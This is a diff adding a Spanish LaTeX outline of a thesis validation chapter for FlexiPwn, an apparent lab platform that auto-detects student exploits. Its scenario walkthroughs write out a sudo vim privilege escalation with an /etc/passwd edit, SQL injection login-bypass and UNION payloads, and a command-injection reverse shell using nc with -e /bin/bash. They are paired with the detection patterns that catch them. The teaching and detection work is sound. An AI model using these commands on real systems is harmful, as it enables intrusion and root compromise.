@@ -1,2 +1,130 @@
 \chapter{Validación}
 \section{Evaluación}
+
+% ===========================================================================
+% BOSQUEJO DE TRABAJO — Por desarrollar a medida que se realicen pruebas
+% reales del sistema (CLCERT, red DCC, escenarios multi-estudiante, etc.).
+%
+% Las secciones 5.1 a 5.3 se podrían añadir ya: los tres escenarios están
+% funcionando en el repo y los walkthroughs ya están redactados en el README
+% del repositorio público.
+%
+% Las secciones 5.4 y 5.5 dependen de pruebas que aún faltan.
+% ===========================================================================
+
+% ---------------------------------------------------------------------------
+% 5.1 Metodología y criterios de validación
+% ---------------------------------------------------------------------------
+% - Recordar el criterio declarado en el Capítulo 1: validación automática
+%   para al menos tres categorías entre web / database / pwning / forensics /
+%   reversing, sin necesidad de flags manuales.
+% - Describir cómo se valida cada escenario: setup (imagen y configuración),
+%   ejecución del exploit por parte del estudiante, targets esperados,
+%   targets disparados, evidencia capturada (panel SSH, output del REPL).
+% - Aclarar que la validación opera en dos niveles:
+%     (a) los escenarios funcionan y disparan los targets de forma correcta;
+%     (b) el sistema se sostiene bajo uso realista — pruebas pendientes.
+
+% ---------------------------------------------------------------------------
+% 5.2 Cobertura del criterio de éxito
+% ---------------------------------------------------------------------------
+% - Tabla resumen con los tres escenarios:
+%     columna 1: escenario
+%     columna 2: categoría (privesc, sqli, network)
+%     columna 3: monitores involucrados (FS, Proc, Log, Red)
+%     columna 4: tipos de target ejercitados
+% - Mostrar que entre los tres se cubren los cuatro monitores y los nodos
+%   lógicos (al menos un escenario con and / or si aplica).
+% - Conectar con el objetivo declarado: "al menos tres categorías".
+
+% ---------------------------------------------------------------------------
+% 5.3 Escenarios validados
+% ---------------------------------------------------------------------------
+
+% \subsection{Privilege Escalation vía sudo vim (pwning)}
+%   - Setup: imagen flexipwn/vuln-sudo (sshd + sudo NOPASSWD vim).
+%   - Walkthrough del estudiante:
+%       ssh student-XXXXXX@host -p PORT       (al atacante)
+%       ssh ctfuser@flexipwn-<env>-vulnerable  (al vulnerable)
+%       sudo -l                                (descubre el privilegio)
+%       sudo vim -c ':!bash'                   (escalada)
+%       echo "pwned" > /root/flag.txt          (evidencia)
+%       echo "..." >> /etc/passwd              (modificación)
+%   - Targets disparados:
+%       file_created /root/*.txt
+%       file_modified /etc/passwd
+%       process_running euid=0 cmd=bash ancestor_contains=sudo
+%   - Salida esperada del REPL del educador.
+
+% \subsection{SQL Injection Login Bypass (web)}
+%   - Setup: imagen flexipwn/vuln-sqli-mysql (Flask + MySQL en :5001, general_log on).
+%   - Walkthrough del estudiante:
+%       payload 1: admin' OR '1'='1' --        (bypass clásico)
+%       payload 2: UNION SELECT ... FROM sensitive_data --  (extracción)
+%   - Targets disparados (mezcla log_pattern + network_payload con
+%     capture_filter "port 3306"):
+%       log_pattern OR.*1.*=.*1
+%       log_pattern authentication_success
+%       log_pattern SELECT.*sensitive_data
+%       network_payload OR.*1.*=.*1
+%       network_payload FLAG{sql_injection_detected}
+%   - Discutir cómo logs y red se refuerzan: el mismo payload activa varios
+%     targets por canales independientes.
+
+% \subsection{Command Injection -> Reverse Shell (network)}
+%   - Setup: imagen flexipwn/vuln-command-injection (Flask /ping?host= + nc).
+%   - Walkthrough del estudiante (necesita dos sesiones SSH al atacante):
+%       Terminal A: nc -lvp 4444
+%       Terminal B: curl ".../ping?host=;nc <attacker> 4444 -e /bin/bash"
+%       Terminal A (ya con la reverse shell): echo "owned" > /root/win.txt
+%   - Targets disparados:
+%       network_connection dst_port=4444
+%       file_created /root/*.txt
+%   - Nota: este escenario justifica el sidecar tcpdump (Capa 2) y la red
+%     externa atacante-host (Capa 1).
+
+% ---------------------------------------------------------------------------
+% 5.4 Pruebas de robustez del sistema  — PENDIENTES
+% ---------------------------------------------------------------------------
+% Cada uno requiere ejecutar la prueba y registrar el resultado:
+%
+% - Manejo de YAML malformado: validar que Pydantic devuelve un mensaje claro
+%   identificando el campo problemático sin ejecutar el sistema.
+% - Manejo de contenedor caído a mitad del run: verificar que on_stopped lleva
+%   al estado failed o stopped correctamente, y que el daemon no queda colgado.
+% - Manejo de participante duplicado / username repetido.
+% - Manejo de scenario id no encontrado en run start.
+% - Pruebas de batch-start con N estudiantes simultáneos (aula completa):
+%   contar timeouts, fallos por límite de puertos del rango 2200-2299,
+%   contención de la base SQLite.
+% - Tiempo de detección desde el evento (acción del estudiante) hasta la
+%   alerta visible en el REPL del educador. Medir gap real de polling.
+% - "Trampa" en tcpdump: enviar un payload SQLi por fuera del flujo normal del
+%   escenario (por ejemplo, desde una terminal del host atacante con curl
+%   directo) y verificar que el monitor de red lo detecta igualmente.
+% - run reset: verificar que el env_id cambia, que el ExerciseRun se preserva,
+%   que los TargetResult del intento previo quedan con reset_at, y que el
+%   nuevo intento empieza limpio.
+% - exit/Ctrl+D en cliente attached vs daemon stop: comprobar la separación.
+
+% ---------------------------------------------------------------------------
+% 5.5 Pruebas en infraestructura real  — PENDIENTES
+% ---------------------------------------------------------------------------
+% - Despliegue en servidor del CLCERT.
+% - Exposición controlada a la red del DCC / la universidad.
+% - Pruebas de aislamiento entre estudiantes:
+%     un estudiante intenta resolver hostnames del entorno de otro
+%     un estudiante intenta egresar al host
+%     un estudiante intenta llegar al daemon FlexiPwn
+% - Pruebas de escape de contenedor (al menos un par de técnicas conocidas):
+%   verificar que el modo rootless contiene el escape como se afirmó en
+%   el Capítulo de Implementación.
+% - Sesión piloto con un grupo de estudiantes reales (si se llega a alcanzar):
+%   medir UX, tiempos de onboarding, fricciones del flujo educador-estudiante.
+
+% ---------------------------------------------------------------------------
+% 5.6 Discusión  (cierre del capítulo)
+% ---------------------------------------------------------------------------
+% - Qué demuestran los tres escenarios respecto al criterio del Capítulo 1.
+% - Qué queda como pendiente y cuál es su impacto.
+% - Hilo con el Capítulo de Conclusión: trabajo futuro y reflexión final.
